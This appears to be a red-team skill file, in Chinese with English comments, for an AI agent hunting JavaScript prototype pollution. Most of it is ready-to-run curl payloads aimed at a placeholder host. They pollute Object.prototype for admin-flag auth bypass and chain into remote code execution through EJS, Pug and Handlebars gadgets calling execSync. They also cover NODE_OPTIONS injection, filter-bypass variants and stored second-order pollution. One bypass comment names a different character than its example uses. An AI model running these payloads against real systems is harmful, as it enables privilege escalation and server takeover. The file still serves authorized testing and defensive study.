---
name: hunt-prototype-pollution
description: 猎捕客户端与服务端原型链污染，用于 XSS、认证绕过和 RCE。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  tags: [redteam, prototype-pollution, XSS, RCE, JavaScript, Node.js, jQuery]
  category: redteam
  related_skills:
    - hunt-frameworks
    - hunt-xss
    - hunt-api-misconfig
---

# 原型链污染猎捕

猎捕原型链污染漏洞：用户提供的属性被合并进 `Object.prototype`，从而影响运行时中的所有对象。客户端污染可实现 DOM XSS、cookie 操纵和认证绕过。服务端污染可通过模板引擎（EJS、Pug、Handlebars）和 CLI 包装器（child_process、NODE_OPTIONS）中的利用链串联至 RCE。

## When to Use

- 应用使用 JavaScript/Node.js，并针对用户输入执行对象 merge、clone 或 extend 操作。
- jQuery `$.extend(true, ...)` 或 `$.fn.merge()` 对不可信数据执行深拷贝。
- Lodash `_.merge()`、`_.defaultsDeep()`、`_.set()` 接收请求体/查询参数。
- 模板引擎（EJS、Pug、Handlebars）与用户控制的对象处于同一运行时。
- 服务端 Node.js 的 `child_process.exec`/`spawn` 可通过被污染的选项访问。

## Prerequisites

- 针对目标的明确授权、目标边界与速率限制。
- 工具：`curl`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），必须在执行命令前立即获得明确确认。

## How to Run

```bash
# client-side: pollute via query param
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page?__proto__[polluted]=true"

# server-side: pollute via JSON body
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
```

## 快速检测

```bash
# client-side: pollute via query param
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page?__proto__[polluted]=true"

# server-side: pollute via JSON body
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
```

## Procedure

### 阶段 1——客户端污染向量

```bash
# URL query string
https://target.com/?__proto__[test]=polluted
https://target.com/?constructor[prototype][test]=polluted

# JSON body in API
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":"yes"}}'

# Form-encoded
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/form" \
  -d '__proto__[polluted]=true'

# Via Object.assign / spread in request handlers
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'
```

### 阶段 2——经由利用链实现服务端 RCE

**EJS RCE（outputFunctionName）：**
```bash
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/render" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"_tmp;global.process.mainModule.require(\"child_process\").execSync(\"id\");"}}'
```

**Pug RCE（self.block）：**
```bash
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/preferences" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require(\"child_process\").execSync(\"id\")"}}}'
```

**Handlebars RCE（compileFunction）：**
```bash
curl --max-time 30 --connect-timeout 10 -sk -X PUT "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"precompileOptions":{"knownHelpersOnly":false,"compat":true},"compileFunction":"return process.mainModule.require(\"child_process\").execSync(\"id\").toString();"}}'
```

**NODE_OPTIONS 注入：**
```bash
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/task" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","shell":"/bin/sh","env":{"NODE_DEBUG":"test"}}}'
```

### 阶段 3——过滤器绕过技术

```bash
# Unicode normalization (e.g., ä → a)
https://target.com/?__proto__[test]=1         # blocked
https://target.com/?__pröto__[test]=1         # bypass (ä normalizes to a)

# constructor.prototype path
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/data" \
  -d '{"constructor":{"prototype":{"polluted":true}}}'

# Array pollution (lodash specific)
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/data" \
  -d '{"__proto__":{"polluted":[]}}'  # forces array coercion

# ppfuzz — automated prototype pollution scanner
ppfuzz -u https://target.com/api/merge -m POST -H "Content-Type: application/json"
```

### 阶段 4——客户端利用

```javascript
// Verify pollution in browser console
Object.prototype.polluted  // should return the injected value

// DOM XSS via polluted options
// If the app uses jQuery $.extend with polluted {url: "javascript:alert(1)"}

// Auth bypass: pollute isAdmin
// If the app checks if (user.isAdmin) without hasOwnProperty
```

### 阶段 5——二阶污染

```bash
# Store pollution in database, triggered by background job
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":{"__proto__":{"isAdmin":true}}}'

# Later, when an admin views the profile or a cron job processes it,
# the pollution triggers in that context
```

## Pitfalls

- **并非请求中的每个 `__proto__` 都是发现。** 只有当被污染的属性实际影响应用行为时才可报告。
- **Node.js 12+ 与较新的 lodash 版本具有部分缓解措施。** 应先在旧版本上测试。
- **服务端污染需要利用链。** 污染随机对象而未触及汇点（exec、eval、template）没有影响。
- **BlackFan 的客户端原型链污染目录**是权威参考——将发现与其交叉核对。

## Verification

1. 注入 `__proto__[test]=value`，并在浏览器控制台或服务端响应中验证 `Object.prototype.test === value`。
2. 对于 RCE：确认命令执行在可见的汇点中产生输出（id/whoami）。
3. 对于 XSS：验证被污染的属性到达 `innerHTML`、`eval`、`document.write` 或脚本的 `src` 属性。
4. 记录确切的 merge/copy 函数以及被污染的属性链。

---

## 相关技能

- **`hunt-frameworks`**——Node.js 特定漏洞，包括 Express/Next.js 中的原型链污染。
- **`hunt-xss`**——DOM XSS 常可通过客户端原型链污染加以利用。
- **`hunt-api-misconfig`**——对请求体执行对象合并而未做 `hasOwnProperty` 检查。
